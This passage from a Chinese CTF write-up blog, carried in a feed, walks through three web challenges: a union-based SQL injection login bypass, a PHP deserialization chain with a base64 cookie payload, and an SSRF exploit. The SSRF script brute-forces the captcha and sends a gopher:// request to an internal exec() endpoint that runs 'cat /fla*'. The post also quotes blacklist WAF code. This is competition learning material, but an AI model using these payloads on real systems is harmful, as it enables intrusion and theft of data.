&#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $message = <span class="string">"wrong user"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $message = <span class="string">"user not exist or wrong password"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>查看代码，看到存在<code>sqlWaf</code>函数，该waf函数只对<code>$_POST[password]</code>参数做了检测</p><p>通过代码还能看到获取flag的条件，需要<code>SELECT * FROM users WHERE username=&#39;$_POST[username]&#39; AND password= &#39;$_POST[password]&#39;</code>查询出的<code>$row[&#39;username&#39;]</code>为admin，并且<code>$row[&#39;password&#39;]</code>等于<code>$_POST[password]</code></p><p>这里构造</p><pre><code>username=&apos; union select 1,&quot;admin&quot;,&quot;1&quot;-- -&amp;password=1&amp;captcha=图形验证码</code></pre><p>就可以满足要求，此时sql执行的结果为：<code>$row[&#39;username&#39;]</code>为admin，<code>$row[&#39;password&#39;]</code>为1，<code>$row[&#39;password&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>相等</p><p><img src="http://pic.c1imber.top/blog/20201207/QRBQRHCj6uG8.png?imageslim" alt="mark"></p><p>获取到flag：</p><p>flag{de3110dce011088cd4add1950a49182f}</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>打开后是index.php是一个登录页面</p><p><img src="http://pic.c1imber.top/blog/20201207/rn7W3RlFz1h3.png?imageslim" alt="mark"></p><p>根据题目提示下载源码进行简单的审计</p><p>index.php 131-132行</p><p>通过addslashes函数对传入的<code>$_POST[&#39;username&#39;]</code>和<code>$_POST[&#39;password&#39;]</code>进行了处理，防止了sql注入</p><p><img src="http://pic.c1imber.top/blog/20201207/6fSWU2JqwsiC.png?imageslim" alt="mark"></p><p>但是看conn.php当中有可能存在反序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </div><div class="line"></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $table = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</div><div class="line">    <span class="keyword">public</span> $conn;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"xxxxx"</span>, <span class="string">"xxxx"</span>, <span class="string">"xxxx"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</div><div class="line">        $result = <span class="keyword">$this</span>-&gt;query();</div><div class="line">        <span class="keyword">if</span> ($result === <span class="keyword">false</span>) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"database error, please check your input"</span>);</div><div class="line">        &#125;</div><div class="line">        $row = $result-&gt;fetch_assoc();</div><div class="line">        <span class="keyword">if</span>($row === <span class="keyword">NULL</span>)&#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">"username or password incorrect!"</span>);</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</div><div class="line">            $flag = file_get_contents(<span class="string">'flag.php'</span>);</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome, admin! this is your flag -&gt; "</span>.$flag;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"welcome! but you are not admin"</span>;</div><div class="line">        &#125;</div><div class="line">        $result-&gt;free();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query (<span class="string">"select username,password from "</span>.<span class="keyword">$this</span>-&gt;table.<span class="string">" where username='"</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"' and password='"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"'"</span>);</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span>&#123;</div><div class="line">        $blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;table, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;username, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</div><div class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;password, $value))&#123;</div><div class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;conn)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;connect ();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;waf();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;check_login();</div><div class="line">        <span class="keyword">$this</span>-&gt;conn-&gt;close();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>而在index.php第115行：<code>$last_login_info = unserialize (base64_decode ($_COOKIE[&#39;last_login_info&#39;]));</code>这段代码刚好可以触发<code>SQL类</code>的<code>__wakeup</code>函数，造成反序列化漏洞，导致<code>SQL类</code>当中的属性可控</p><p>SQL类当中的waf过滤了很多字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</div></pre></td></tr></table></figure><p>但是没有过滤单引号，于是构造出poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"> <span class="keyword">public</span> $table=<span class="string">"users"</span>;</div><div class="line"> <span class="keyword">public</span> $username=<span class="string">"' or '1"</span>;</div><div class="line"> <span class="keyword">public</span> $password=<span class="string">"' or '1"</span>;  </div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> SQL()));</div></pre></td></tr></table></figure><p>获得：</p><pre><code>TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>访问index.php，传入</p><pre><code>Cookie: last_login_info=TzozOiJTUUwiOjM6e3M6NToidGFibGUiO3M6NToidXNlcnMiO3M6ODoidXNlcm5hbWUiO3M6NzoiJyBvciAnMSI7czo4OiJwYXNzd29yZCI7czo3OiInIG9yICcxIjt9</code></pre><p>获取到flag</p><p>flag{5dd2d5f45fw6e6f11ewf1f224f5121e2}</p><p><img src="http://pic.c1imber.top/blog/20201207/8kpluRrm76mM.png?imageslim" alt="mark"></p><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>比赛时没做出来，说一下当时的思路</p><p>首先file协议读了源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</div><div class="line">init(); </div><div class="line"></div><div class="line">$is_die = <span class="number">0</span>;</div><div class="line">$is_post = <span class="number">0</span>;</div><div class="line">$die_mess = <span class="string">''</span>;</div><div class="line">$url = <span class="string">''</span>;  </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'captcha'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'captcha'</span>]))</div><div class="line">&#123;</div><div class="line">    $url = $_POST[<span class="string">'url'</span>];</div><div class="line">    $captcha = $_POST[<span class="string">'captcha'</span>];</div><div class="line">    $is_post = <span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> ( $captcha !== $_SESSION[<span class="string">'answer'</span>])</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"wrong captcha"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/flag|proc|log/i'</span>, $url) )</div><div class="line">    &#123;</div><div class="line">        $die_mess = <span class="string">"hacker"</span>;</div><div class="line">        $is_die = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>可以看到过滤了flag，其实这里直接url编码一次就可以绕过了，当时没想到这点，感觉这样解应该算是非预期了</p><p>lib.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</div><div class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">    $output = curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">    <span class="keyword">return</span> $output;</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $answer = rand(<span class="number">1</span>,<span class="number">100000</span>);</div><div class="line">    $_SESSION[<span class="string">'captcha'</span>] = substr(md5($answer),<span class="number">-6</span>,<span class="number">6</span>);</div><div class="line">    $_SESSION[<span class="string">'answer'</span>] = strval($answer);</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy_session</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $_SESSION = [];</div><div class="line">&#125;   </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'captcha'</span>]) || !<span class="keyword">isset</span>($_SESSION[<span class="string">'answer'</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]))</div><div class="line">    &#123;</div><div class="line">        destroy_session();</div><div class="line">        set_session();</div><div class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>]) ? <span class="keyword">die</span>(<span class="string">"&lt;script&gt;location.href='./index.php'&lt;/script&gt;"</span>) : <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>正常的请求读取代码，存在ssrf</p><p>端口扫描脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> requests </div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">8080</span>,<span class="number">65535</span>):</div><div class="line">    session = requests.Session()</div><div class="line">    url=<span class="string">"http://124.71.187.100:8079/index.php"</span></div><div class="line">    headers = &#123;<span class="string">"Origin"</span>:<span class="string">"http://124.71.187.100:8079"</span>,<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Referer"</span>:<span class="string">"http://124.71.187.100:8079/index.php"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">    res=session.get(url,headers=headers).text</div><div class="line">    code=res.split(<span class="string">'== "'</span>)[<span class="number">1</span>].split(<span class="string">'"'</span>)[<span class="number">0</span>]</div><div class="line">    <span class="comment">#print code</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100000</span>):</div><div class="line">        <span class="keyword">if</span> hashlib.md5(str(i)).hexdigest()[<span class="number">-6</span>:]==code:</div><div class="line">            <span class="comment">#print i</span></div><div class="line">            <span class="comment">#paramsPost = &#123;"captcha":"&#123;&#125;".format(i),"url":"file:///var/www/htmlssrf123123/index.php"&#125;</span></div><div class="line">            paramsPost = &#123;<span class="string">"captcha"</span>:<span class="string">"&#123;&#125;"</span>.format(i),<span class="string">"url"</span>:<span class="string">"gopher://127.0.0.1:47852/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A47852%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Acmd%253Dcat%2520%252Ffla%252A%250A"</span>&#125;</div><div class="line">            response = session.post(<span class="string">"http://124.71.187.100:8079/index.php"</span>, data=paramsPost)</div><div class="line">            <span class="keyword">print</span> response.text</div><div class="line">            <span class="keyword">if</span> len(response.text)!=<span class="number">1046</span>:</div><div class="line">                <span class="keyword">if</span> <span class="string">"wrong captcha"</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</div><div class="line">                    <span class="comment">#print str(port)+"\n"</span></div><div class="line">                    <span class="comment">#print response.text</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">    <span class="keyword">break</span></div></pre></td></tr></table></figure><p>跑了一遍，很慢，啥也扫不到</p><p>换个思路，因为目前可以读文件，所以先信息搜集一下，读取apache配置文件：<code>file:///etc/apache2/sites-enabled/000-default.conf</code></p><pre><code>&lt;VirtualHost *:80&gt;        ServerAdmin webmaster@localhost        DocumentRoot /var/www/html        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;  &lt;VirtualHost *:47852&gt;        ServerAdmin secret@localhost        DocumentRoot /var/www/htmlssrf123123        ErrorLog ${APACHE_LOG_DIR}/error.log        CustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;</code></pre><p>读取源码:<code>file:///var/www/htmlssrf123123/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">        <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</div><div class="line">        exec($_POST[<span class="string">'cmd'</span>]);</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span>    &lt;/div&gt;</div></pre></td></tr></table></figure><p>由于exec函数没有回显，所以只能通过反弹shell（不出网）、写入文件（/tmp目录都写不进去）、延时盲注（sleep 5存在延时）进行回显，但是前两种方法均一直不能成功,看了好几篇wp也都是二次url编码的非预期解，不知道是不是题目有问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink&quot; title=&quot;序&quot;&gt;&lt;/a&gt;序&lt;/h1&gt;&lt;p&gt;补一下，11月份的比赛，太忙一直没时间更新&lt;/p&gt;
&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
